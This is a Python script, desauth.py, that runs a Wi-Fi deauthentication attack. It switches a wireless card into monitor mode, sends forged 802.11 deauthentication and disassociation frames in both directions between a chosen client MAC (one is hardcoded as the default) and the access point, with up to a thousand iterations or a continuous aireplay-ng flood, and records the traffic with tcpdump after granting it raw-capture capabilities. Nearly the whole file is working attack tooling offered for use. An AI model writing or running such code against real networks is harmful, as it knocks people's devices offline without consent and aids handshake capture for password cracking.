#!/usr/bin/env python3
# desauth.py
# Run: sudo python3 desauth.py

import sys
import subprocess
import time
import os
import re
import signal
import argparse
from pathlib import Path

from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
from scapy.layers.dot11 import Dot11Action

from element import NetworkInfo  # local module

# === Default parameters ===

DEFAULT_TARGET_MAC = "50:91:E3:1C:9B:E4"
FORCED_CHANNEL = 6
USE_SCAPY = True  # True = Scapy ; False = aireplay-ng

# Base directory of the script
BASE_DIR = Path(__file__).resolve().parent

# Capture folder
FILE_DIR = BASE_DIR / "desauthcapture"

TCPDUMP_PATH = "/usr/sbin/tcpdump"
TCPDUMP_CAPS = "cap_net_raw,cap_net_admin=eip"


def run(cmd, check=False, capture=False, text=True):
    """Helper for subprocess.run()."""
    return subprocess.run(
        cmd,
        check=check,
        capture_output=capture,
        text=text,
    )


def ensure_capture_dir_owned_by_user():
    """
    Ensure the desauthcapture/ folder exists and is owned by the current user.
    """
    FILE_DIR.mkdir(exist_ok=True)
    try:
        st = FILE_DIR.stat()
        uid = os.getuid()
        if st.st_uid != uid:
            print(f"[!] '{FILE_DIR}' is not owned by your user. Fixing (sudo chown)...")
            run(["sudo", "chown", "-R",
                 f"{os.getenv('USER')}:{os.getenv('USER')}",
                 str(FILE_DIR)], check=False)
    except Exception:
        print("[!] Unable to verify/change ownership of the capture directory.")
        print("    If you still see a lock, run: sudo chown -R $USER:$USER desauthcapture")


def tcpdump_has_caps() -> bool:
    """
    Check whether tcpdump has the required capabilities.
    """
    try:
        res = run(["getcap", TCPDUMP_PATH], capture=True)
        out = (res.stdout or "").strip()
        return "cap_net_raw" in out and "cap_net_admin" in out and "eip" in out
    except FileNotFoundError:
        print("[ERROR] 'getcap' not found. Install libcap2-bin: sudo apt install libcap2-bin")
    except Exception as e:
        print(f"[!] Error checking tcpdump capabilities: {e}")
    return False


def ensure_tcpdump_caps():
    """
    Apply setcap if tcpdump does not have the required capabilities.
    """
    if not os.path.exists(TCPDUMP_PATH):
        print(f"[ERROR] tcpdump not found at: {TCPDUMP_PATH}")
        print("        Find its path with: which tcpdump")
        return

    if tcpdump_has_caps():
        print("[+] tcpdump already has the required capabilities.")
        return

    print("[!] tcpdump does not have the required capabilities.")
    print(f"[+] Applying: sudo setcap {TCPDUMP_CAPS} {TCPDUMP_PATH}")
    try:
        run(["sudo", "setcap", TCPDUMP_CAPS, TCPDUMP_PATH], check=True)
        if tcpdump_has_caps():
            print("[+] tcpdump capabilities OK.")
        else:
            print("[!] setcap executed but capabilities not detected. Verify with: getcap /usr/sbin/tcpdump")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] setcap failed: {e}")
    except Exception as e:
        print(f"[ERROR] Exception during setcap: {e}")


# === Monitor mode enable/disable ===

def enable_monitor_mode(interface):
    print(f"[+] Enabling monitor mode on {interface}")
    run(["sudo", "airmon-ng", "start", interface])


def disable_monitor_mode(interface_mon):
    print(f"[+] Disabling monitor mode on {interface_mon}")
    run(["sudo", "airmon-ng", "stop", interface_mon])


def set_channel(interface_mon, channel):
    print(f"[+] Setting {interface_mon} to channel {channel}")
    run(["sudo", "iwconfig", interface_mon, "channel", str(channel)])


def wifi_recover(interface):
    print("[+] Recovering Wi-Fi (managed mode + NetworkManager restart)...")

    # 1) force managed mode
    run(["sudo", "ip", "link", "set", interface, "down"])
    run(["sudo", "iw", interface, "set", "type", "managed"])
    run(["sudo", "ip", "link", "set", interface, "up"])

    # 2) restart NetworkManager + wpa_supplicant
    run(["sudo", "systemctl", "restart", "NetworkManager"])
    run(["sudo", "systemctl", "restart", "wpa_supplicant"])

    # 3) toggle Wi-Fi radio (often helps)
    run(["nmcli", "radio", "wifi", "off"])
    time.sleep(1)
    run(["nmcli", "radio", "wifi", "on"])


# === Generate a unique .pcap filename ===

def get_next_pcap_name():
    FILE_DIR.mkdir(exist_ok=True)
    max_num = 0
    for name in os.listdir(FILE_DIR):
        if not name.startswith("deauth_capture_") or not name.endswith(".pcap"):
            continue
        num_part = name[len("deauth_capture_"):-len(".pcap")]
        if num_part.isdigit():
            max_num = max(max_num, int(num_part))
    next_number = max_num + 1
    return FILE_DIR / f"deauth_capture_{next_number}.pcap"


# === Start tcpdump to record packets ===

def start_tcpdump_capture(pcap_file, iface, bssid=""):
    """
    Start tcpdump WITHOUT sudo (thanks to setcap capabilities).
    Optional: apply BSSID filter if provided.
    """
    try:
        print(f"[+] Starting tcpdump capture to {pcap_file}")
        cmd = ["tcpdump", "-i", iface, "-w", str(pcap_file)]

        if bssid:
            cmd += ["ether", "host", bssid]

        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Error starting tcpdump: {e}")
        return None


def stop_tcpdump(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
            print("[+] Tcpdump terminated.")
        except Exception:
            try:
                proc.kill()
                print("[+] Tcpdump killed.")
            except Exception as e2:
                print(f"[!] Error stopping tcpdump: {e2}")


# === Send Deauth packets with aireplay-ng ===

def launch_aireplay_deauth(iface_mon, target_mac, ap_mac):
    print(f"[+] Launching aireplay-ng Deauth on channel {FORCED_CHANNEL} (Ctrl+C to stop)")
    proc = None
    try:
        proc = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "0",
             "-c", target_mac, "-a", ap_mac, iface_mon],
            preexec_fn=os.setsid  # allows killing the entire process group
        )
        proc.wait()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C received: stopping aireplay-ng...")
        if proc and proc.poll() is None:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    return proc


# === Generic bidirectional mgmt sender (Scapy) ===

def send_bidirectional_mgmt(pkt_class, reason, target_mac, ap_mac,
                            iface_mon, nbr=2, label=""):
    if label:
        print(f"[+] Sending bidirectional {label} packets via {iface_mon}")
    else:
        print(f"[+] Sending bidirectional packets via {iface_mon}")

    pkt_ap_to_client = RadioTap() / Dot11(
        addr1=target_mac,
        addr2=ap_mac,
        addr3=ap_mac
    ) / pkt_class(reason=reason)

    pkt_client_to_ap = RadioTap() / Dot11(
        addr1=ap_mac,
        addr2=target_mac,
        addr3=target_mac
    ) / pkt_class(reason=reason)

    try:
        t0 = time.time()
        for _ in range(nbr):
            sendp(pkt_ap_to_client, iface=iface_mon, verbose=0)
            sendp(pkt_client_to_ap, iface=iface_mon, verbose=0)
        t1 = time.time()
        print(f"[+] {2 * nbr} packets sent in {t1 - t0:.2f}s")
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")


def send_deauth_packets(target_mac, ap_mac, iface_mon, Nbr=2):
    send_bidirectional_mgmt(Dot11Deauth, 7, target_mac, ap_mac,
                            iface_mon, Nbr, "Deauth")


def send_disassoc_packets(target_mac, ap_mac, iface_mon, Nbr=2):
    send_bidirectional_mgmt(Dot11Disas, 8, target_mac, ap_mac,
                            iface_mon, Nbr, "Disassociation")


# === Main ===

if __name__ == "__main__":
    info = NetworkInfo.get_wireless_interface_details()

    if not info["interface"] or not info["gateway_mac"]:
        print("[-] No valid Wi-Fi interface or gateway MAC detected.")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="Wi-Fi deauth/disassoc tool (Scapy or aireplay-ng)"
    )

    parser.add_argument(
        "-i", "--interface",
        help="Wireless interface (default: auto-detected)",
        default=info["interface"]
    )
    parser.add_argument(
        "-t", "--target",
        help="Target client MAC address (default: DEFAULT_TARGET_MAC)",
        default=DEFAULT_TARGET_MAC
    )
    parser.add_argument(
        "-a", "--ap",
        help="Access Point MAC address (default: detected gateway MAC)",
        default=info["gateway_mac"]
    )
    parser.add_argument(
        "-n", "--count",
        type=int,
        default=1000,
        help="Number of bidirectional iterations for the main phase (each loop sends 2 frames)."
    )
    parser.add_argument(
        "--no-disassoc",
        action="store_true",
        help="Do not send disassociation frames."
    )
    parser.add_argument(
        "--capture-ap",
        action="store_true",
        help="Use AP MAC as tcpdump BPF filter (ether host <ap>)."
    )

    args = parser.parse_args()

    interface = args.interface
    target_mac = args.target
    ap_mac = args.ap
    iface_mon = interface + "mon"

    ensure_capture_dir_owned_by_user()
    ensure_tcpdump_caps()
    pcap_file = get_next_pcap_name()
    tcpdump_proc = None

    print("\n Configuration:")
    print(f" - Interface      : {interface}")
    print(f" - Target MAC     : {target_mac}")
    print(f" - AP MAC         : {ap_mac}")
    print(f" - Monitor iface  : {iface_mon}")
    print(f" - Channel        : {FORCED_CHANNEL}")
    print(f" - Mode           : {'SCAPY' if USE_SCAPY else 'AIREPLAY-NG'}")
    print(f" - Count          : {args.count}")
    print(f" - Disassoc       : {'NO' if args.no_disassoc else 'YES'}")
    print()

    try:
        enable_monitor_mode(interface)
        set_channel(iface_mon, FORCED_CHANNEL)

        tcpdump_proc = start_tcpdump_capture(
            pcap_file,
            iface_mon,
            ap_mac if args.capture_ap else ""
        )

        if USE_SCAPY:
            # small initial burst
            send_deauth_packets(target_mac, ap_mac, iface_mon, Nbr=2)
            if not args.no_disassoc:
                send_disassoc_packets(target_mac, ap_mac, iface_mon, Nbr=2)
            time.sleep(20)

            # main phase
            send_deauth_packets(target_mac, ap_mac, iface_mon, Nbr=args.count)
            if not args.no_disassoc:
                send_disassoc_packets(target_mac, ap_mac, iface_mon, Nbr=args.count)
            time.sleep(20)
        else:
            launch_aireplay_deauth(iface_mon, target_mac, ap_mac)

    finally:
        stop_tcpdump(tcpdump_proc)
        disable_monitor_mode(iface_mon)
        wifi_recover(interface)
